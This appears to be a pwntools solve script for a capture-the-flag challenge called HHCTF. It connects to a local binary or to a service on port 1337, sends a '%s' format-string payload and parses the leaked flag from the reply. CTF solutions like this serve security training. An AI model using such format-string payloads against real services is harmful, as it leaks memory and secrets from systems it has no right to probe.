#!/usr/bin/env python
import pwn

REMOTE_ADDR = "127.0.0.1"
REMOTE_PORT = "1337"

def get_challenge():
    if pwn.args.REMOTE:
        return pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    else:
        return pwn.process("./chal")

chal = get_challenge()

chal.sendline("%s")

chal.readuntil("HHCTF")

flag = "HHCTF" + chal.readline().strip().decode().split()[0]

chal.close()

print(f"Found the flag: {flag}")
